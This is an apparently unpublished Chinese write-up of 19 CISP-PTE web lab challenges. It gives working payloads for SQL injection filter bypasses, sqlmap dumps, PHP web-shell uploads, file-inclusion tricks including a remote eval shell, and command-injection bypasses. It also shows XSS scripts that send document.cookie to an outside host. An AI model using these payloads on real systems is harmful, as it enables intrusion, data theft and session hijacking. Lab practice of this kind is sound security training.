---
layout: post
title: CISP-PTE 19Web靶场综合
subtitle: CISP-PTE 19Web靶场综合
date: 2025-08-13 15:42
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - 靶场实战
number headings: first-level 2, max 4, 1.1., auto
published: false
---
## 1. SQL 注入（一）

![image.png](https://img.ghostliner.top/d3eKYq.png)

![image.png](https://img.ghostliner.top/wQkD7J.png)

发现空格过滤，使用 `/**/`

利用注释 `-- `﻿,`#`﻿ 无法绕过，尝试补全

使用 `id=1')and('1'='-1`﻿, ﻿`id=1')and('1'='1`﻿ 成功

![image.png](https://img.ghostliner.top/kOm2DU.png)

使用 `id=1')irder/**/by/**/1%23` 成功

![image.png](https://img.ghostliner.top/mY8RwS.png)

使用 order by 确认有 4 列

![image.png](https://img.ghostliner.top/H5Y4Ra.png)

确认显示位置

```sql
'
id=1')union/**/select/**/1,2,3,4,%23
```

发现 `union` 被过滤

![image.png](https://img.ghostliner.top/tKuqXi.png)

双写绕过

```sql
'
id=-1')uunionnion/**/select/**/1,2,3,4%23
```

![image.png](https://img.ghostliner.top/s3QSHq.png)

load_file 读取文件

```sql
'
id=-1')uunionnion/**/select/**/1,2,3,load_file('/var/www/html/key')%23
```

![image.png](https://img.ghostliner.top/ldixXq.png)

测试其他绕过方法

```sql
'
id=-1')%0buunionnion%0a%0c%0dselect%091,2,3,load_file('/var/www/html/key')%23
```

经测试，`%09` `%0a` `%0b` `%0c` `%0d`﻿ 都可行。

## 2. SQL 注入（二）

![image.png](https://img.ghostliner.top/keH0my.png)

```sql
'
id=1%') and 1=1--+
```

发现 and 被过滤

![image.png](https://img.ghostliner.top/RRBDAx.png)

使用双写绕过成功

```sql
'
id=1%') aandnd 1=-1--+
'
id=1%') aandnd 1=1--+
```

确定列数为 7 列

```sql
'
id=-1%') uunionnion select 1,2,3,4,5,6,7--+
```

确定显示位置

![image.png](https://img.ghostliner.top/tQPT9H.png)

获取 key

```sql
'
id=-1%') uunionnion select 1,2,3,load_file('/tmp/360/key'),5,6,7--+
```

![image.png](https://img.ghostliner.top/M4yka9.png)

## 3. SQL 注入（三）

![image.png](https://img.ghostliner.top/vqEBI6.png)

尝试弱密码登录失败

![image.png](https://img.ghostliner.top/ahPhW6.png)

尝试万能密码登录

```sql
password=admin' or '1'='1'--+&username=admin' or '1='1'#
```

发现 `or` 、`--+`、`#` 被过滤

![image.png](https://img.ghostliner.top/wiet7N.png)
使用双写失败，使用大写

```sql
password=12' OR '1'='1'/**&username=12' OR'1'='1'/**
```

![image.png](https://img.ghostliner.top/PxWDMA.png)

取消注释，进行补全

```sql
password=12' OR '1'='1&username=12' OR'1'='1
```

![image.png](https://img.ghostliner.top/y2nDNd.png)

## 4. SQL 注入（四）

![image.png](https://img.ghostliner.top/xK0Mzy.png)

### 4.1. 万能密码

注册用户 `admin`，提示已存在，使用万能密码（`admin'#`）登录

![image.png](https://img.ghostliner.top/rDQziE.png)

单引号登陆失败，使用双引号

![image.png](https://img.ghostliner.top/yjNjAJ.png)

双引号登录成功

![image.png](https://img.ghostliner.top/5FRCPa.png)

### 4.2. sqlmap 爆破

尝试万能密码登录失败

```sql
password=12' OR '1'='1&username=12' OR '1'='1
```

![image.png](https://img.ghostliner.top/TNFnzT.png)

注册用户 `admin`，提示已存在
![image.png](https://img.ghostliner.top/4ZNyCz.png)

尝试绕过

```sql
admin' and '1'='2
```

输入两次都显示注册成功，猜测此处存在盲注

使用 sqlmap 测试

```shell
# 获取数据库
sqlmap.py -r c:\temp\a.txt -p username --dbs
# 获取表
sqlmap.py -r c:\temp\a.txt -p username -D uinfo --tables
# 获取列
sqlmap.py -r c:\temp\a.txt -p username -D uinfo -T users --columns
# dump数据
sqlmap.py -r c:\temp\a.txt -p username -D uinfo -T users -C username,password --dump
```

爆破用户名密码时报错：

![image.png](https://img.ghostliner.top/2379m2.png)

尝试爆破 remark 字段

```shell
sqlmap.py -r c:\temp\a.txt -p username -D uinfo -T users -C remark --stop 1 --dump
```

获取到 key

![image.png](https://img.ghostliner.top/e5H7wu.png)

测试带上 id 爆破 admin 密码

```shell
sqlmap.py -r c:\temp\a.txt -p username -D uinfo -T users -C id,username,password --dump
```

爆破成功

![image.png](https://img.ghostliner.top/Ltz899.png)

登陆后获得同样的 key

![image.png](https://img.ghostliner.top/Z17Lsg.png)

bp 抓包 sqlmap 后发现 payload 带 `order by` 语句，以 id 开头时 `order by id` ，以 password 开头时则是 `order by password`。

![image.png](https://img.ghostliner.top/Cb7l72.png)

![image.png](https://img.ghostliner.top/OzJD9h.png)

## 5. 文件上传（一）

![image.png](https://img.ghostliner.top/gyMsX8.png)

上传 shell.jpg，bp 拦截修改后缀

![image.png](https://img.ghostliner.top/3Qduu3.png)

上传失败，更改后缀为 `phtml`

![image.png](https://img.ghostliner.top/JBYZHm.png)

上传成功

![image.png](https://img.ghostliner.top/MMuJRO.png)

蚁剑连接成功

![image.png](https://img.ghostliner.top/3lpSuv.png)

获取 key

![image.png](https://img.ghostliner.top/ECabcc.png)

获取 flag

![image.png](https://img.ghostliner.top/DKYJow.png)

## 6. 文件上传（二）

![image.png](https://img.ghostliner.top/JOBeU0.png)

上传文件 `shell.jpg`，bp 抓包改为 `shell.phtml` 上传失败，
尝试后缀：`PHTML`、`PHTML.`、`phtml. .` 都上传失败

猜测对文件内容进行过滤，去除文件中 php 代码上传成功

将 `eval` 改为 `system`

![image.png](https://img.ghostliner.top/G1gKuH.png)

上传成功

![image.png](https://img.ghostliner.top/VKonky.png)

获取 flag

![image.png](https://img.ghostliner.top/facP03.png)

## 7. 文件上传（三）

![image.png](https://img.ghostliner.top/J6Bmwg.png)

上传普通图片，成功

![image.png](https://img.ghostliner.top/abQi4r.png)

上传 `shell.jpg` 失败，
将 `eval` 改为 `system`，上传成功

![image.png](https://img.ghostliner.top/7RSMSP.png)

多次上传提高命中率

### 7.1. bp 爆破

访问木马文件，设置 payload

![image.png](https://img.ghostliner.top/dX9BCC.png)

设置随机数范围

![image.png](https://img.ghostliner.top/sKp49n.png)

设置 payload 处理流程

![image.png](https://img.ghostliner.top/l7WVhF.png)

**开始爆破**

爆破成功

![image.png](https://img.ghostliner.top/MGKV3k.png)

访问发现 `key.php`

![image.png](https://img.ghostliner.top/98wdt4.png)

获取到 key

![image.png](https://img.ghostliner.top/3IXI0g.png)

tmp 目录获取到 flag

![image.png](https://img.ghostliner.top/j8TE7J.png)

## 8. 文件包含（一）

![image.png](https://img.ghostliner.top/MyHJEz.png)

发现 url 存在文件包含

![image.png](https://img.ghostliner.top/MjFwwl.png)

尝试获取 `/etc/passwd`，成功

![image.png](https://img.ghostliner.top/LbLw4m.png)

获取到 `key.php`，发现提示：

1. 使用 php://input
2. 使用 php://filter/convert.base64-encode/resource=

![image.png](https://img.ghostliner.top/KeTOVW.png)

使用 php://filter 获取文件内容

```r
http://192.168.163.129:27149/vulnerabilities/fu1.php?file=php://filter/convert.base64-encode/resource=../key.php
```

base64 数据：

```text
R2V0IGl0IQ0K5Y+v5Lul5L2/55SocGhw5Lyq5Y2P6K6uDQox44CBcGhwOi8vaW5wdXQgcG9zdOS8oOmAkuWPguaVsA0KMuOAgXBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9DQo8P3BocA0KDQovL2tleTpmbGFnIGluIC90bXANCj8+
```

解码得到文本：

```text
Get it! ????????????php????????? 1?€?php://input post????€??????? 2?€?ph
p://filter/convert.base64-encode/resource= <?php //key:flag in /tmp ?>
```

使用 php://input 获取 flag

![image.png](https://img.ghostliner.top/ygah0F.png)

flag 值

![image.png](https://img.ghostliner.top/GolHnK.png)

## 9. 文件包含（二）

![image.png](https://img.ghostliner.top/IuDt2N.png)

获取 `/etc/passwd` 失败

![image.png](https://img.ghostliner.top/jmx6hE.png)

使用其他协议测试都报错，直接访问 `view.html`，获取到源码

![image.png](https://img.ghostliner.top/klrYfm.png)

分析：需要使用 POST，参数 Hello，值任意

base64：`W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=` 解码得到

```php
[@eval(base64_decode($_POST[z0]));]
```

可知需要 POST 参数 z0 且为 base64 编码

![image.png](https://img.ghostliner.top/tCwo3C.png)

成功执行代码

![image.png](https://img.ghostliner.top/88FGJT.png)

获取 key

![image.png](https://img.ghostliner.top/DcOB0h.png)

key 值

![image.png](https://img.ghostliner.top/It3zsL.png)

获取 flag

![image.png](https://img.ghostliner.top/HHXR9a.png)

## 10. 文件包含（三）

![image.png](https://img.ghostliner.top/uhhLDm.png)

访问主页

![image.png](https://img.ghostliner.top/Uez1ob.png)

根据 url 猜测有 `.txt` 后缀补全

测试发现可远程包含

![image.png](https://img.ghostliner.top/9zXZeG.png)

启动 phpstudy，搭建本地站点，创建 123.txt

```php
<?php
    eval($_REQUEST[a]);
    phpinfo();
?>
```

远程访问成功

![image.png](https://img.ghostliner.top/D8JdEM.png)

蚁剑连接成功，获取到 key

![image.png](https://img.ghostliner.top/0cImas.png)

`/tmp`﻿ 目录获取到 flag

![image.png](https://img.ghostliner.top/E67i3L.png)

## 11. 命令执行（一）

![image.png](https://img.ghostliner.top/ukakuv.png)

尝试命令

```shell
127.0.0.1|ls # 失败
127.0.0.1| # 成功，ls被过滤
127.0.0.1|pwd # 获取到当前路径 /app/vulnerabilities
```

获取到路径

![image.png](https://img.ghostliner.top/NGh3g7.png)

```shell
127.0.0.1|\l\s
```

![image.png](https://img.ghostliner.top/8FTd0h.png)

```shell
127.0.0.1|l\s ../
```

![image.png](https://img.ghostliner.top/zaecqL.png)

```shell
127.0.0.1|tac ../key.php
```

获取到 key

![image.png](https://img.ghostliner.top/GSKKU0.png)

```shell
127.0.0.1|l\s /tmp
```

获取到 flag

![image.png](https://img.ghostliner.top/UN1Kue.png)

## 12. 命令执行（二）

![image.png](https://img.ghostliner.top/cdfRhy.png)

```shell
127.0.0.1|ls ../
```

发现 `key.php`

![image.png](https://img.ghostliner.top/hvY3ma.png)

```shell
127.0.0.1|tac ../key.php
```

查看文件失败

![image.png](https://img.ghostliner.top/Cq8hhb.png)

```shell
127.0.0.1| tac ../ke?.ph?
```

发现非文件名过滤，
使用命令：cat tac more less head tail 失败

使用 awk 命令

```shell
127.0.0.1|awk "{print}" ../key.php
```

成功，获取到 key

![image.png](https://img.ghostliner.top/0egEUL.png)

查看 `/tmp`，获取到 flag

![image.png](https://img.ghostliner.top/WHXgMS.png)

## 13. 命令执行（三）

![image.png](https://img.ghostliner.top/88el2N.png)

```shell
127.0.0.1|ls # 报错
127.0.0.1| # 报错
```

`|` 被过滤，尝试 `;` `&`，发现 `&` 未过滤

```shell
# ls被过滤
127.0.0.1&\l\s
```

执行成功

![image.png](https://img.ghostliner.top/NCUTPo.png)

```shell
127.0.0.1&\l\s ../
```

发现 key.php 文件

![image.png](https://img.ghostliner.top/TV9fAr.png)

```shell
127.0.0.1&\l\s ../key.php # 执行失败
127.0.0.1&ta\c index.p\h\p # 执行成功
```

发现过滤了命令和文件名

```shell
127.0.0.1&ta\c ../k\e\y.p\h\p
127.0.0.1&ta\c ../k\e\y.p'h'p
```

尝试多种绕过未成功，猜测无权限读取，查看文件权限

```shell
127.0.0.1&l\s -al ../
```

发现无权限

![image.png](https://img.ghostliner.top/QFuJsi.png)

添加权限

```shell
127.0.0.1&chm\o\d 777 ../key.p\h\p
127.0.0.1&l\s -al ../
```

![image.png](https://img.ghostliner.top/32m7Mj.png)

读取文件

![image.png](https://img.ghostliner.top/DVb3DA.png)

`/tmp` 下发现 flag

![image.png](https://img.ghostliner.top/ewOhVd.png)

## 14. 日志审计（一）

![image.png](https://img.ghostliner.top/r4UNtq.png)

下载 `access.log`，进行分析

对文件内容进行正则过滤，点击 `在当前文件中查找`

![image.png](https://img.ghostliner.top/j6tfja.png)

发现文件上传路径

![image.png](https://img.ghostliner.top/NSLUXC.png)

发现对 `adminlogin.php` 的爆破

![image.png](https://img.ghostliner.top/blsier.png)

使用 bp 爆破登录页面

![image.png](https://img.ghostliner.top/2vvxzI.png)

获取到密码：**password123**

![image.png](https://img.ghostliner.top/WCFuMb.png)

登陆成功获得提示

![image.png](https://img.ghostliner.top/Is8lT2.png)

测试文件包含失败，测试命令执行成功

![image.png](https://img.ghostliner.top/bzJAp2.png)

`/tmp` 目录发现 flag

![image.png](https://img.ghostliner.top/jnVTBA.png)

## 15. 日志审计（二）

![image.png](https://img.ghostliner.top/pE2enR.png)

下载日志，分析发现只有一个 IP 地址

过滤内容

![image.png](https://img.ghostliner.top/c7m1Lg.png)

发现 `backdoor.php`

![image.png](https://img.ghostliner.top/2iMs7b.png)

访问获取到 key

![image.png](https://img.ghostliner.top/9FXuIx.png)

访问 flag9.php

![image.png](https://img.ghostliner.top/0q7fPx.png)

根据提示可能为文件包含或命令执行，测试

![image.png](https://img.ghostliner.top/0GtKEV.png)

在 `/tmp` 目录发现 flag

![image.png](https://img.ghostliner.top/cAZ5IO.png)

## 16. 暴力破解

![image.png](https://img.ghostliner.top/tPHEQr.png)

输入密码和验证码，bp 抓包设置 payload

![image.png](https://img.ghostliner.top/VWl3Nm.png)

爆破，获取到 key

![image.png](https://img.ghostliner.top/irQa4E.png)

## 17. XSS（一）

发现提交内容框，尝试 XSS

![image.png](https://img.ghostliner.top/yNbEiu.png)

成功

![image.png](https://img.ghostliner.top/TQWlgT.png)

存在 XSS 注入，添加远程访问代码

```html
<!-- 方法1 -->
<script>
  document.write(
    '<img src="http://192.168.163.134/?' + document.cookie + '"/>'
  );
</script>
<!-- 方法2 -->
<script>
  var img = new Image();
  img.src = "http://192.168.163.134/?" + document.cookie;
</script>
<!-- 方法3，不推荐 -->
<script>
  document.location = "http://192.168.163.134/?" + document.cookie;
</script>
```

![image.png](https://img.ghostliner.top/0CItjv.png)

日志中发现 cookie

![image.png](https://img.ghostliner.top/PGISna.png)

填入后登录成功，获取到 key

![image.png](https://img.ghostliner.top/JVEHHY.png)

## 18. XSS（二）

![image.png](https://img.ghostliner.top/BqzhJp.png)

留言页面填入

```html
<script>
  alert(123);
</script>
```

![image.png](https://img.ghostliner.top/CBxWm6.png)

存在 XSS 注入，添加远程访问代码

![image.png](https://img.ghostliner.top/penkLd.png)

查看日志，获取到 key

![image.png](https://img.ghostliner.top/q7ptN6.png)

## 19. 二阶注入

```php
<?php session_start();?>
```

![image.png](https://img.ghostliner.top/DVQhnU.png)

注册普通用户，登录显示无权限，发现可以重置密码

![image.png](https://img.ghostliner.top/65wY3n.png)

**思路**：注册新用户，用户名 `admin'#`，登录后重置密码，若存在二阶注入，将会更改 `admin` 用户的密码

尝试注册 `admin'#`

![image.png](https://img.ghostliner.top/739ZyC.png)

以 `admin'#` 身份登录

![image.png](https://img.ghostliner.top/HU7QNg.png)

登录后重置密码，之后退出登录，再以 admin 账号登录，成功获取 key

![image.png](https://img.ghostliner.top/QxiEFM.png)
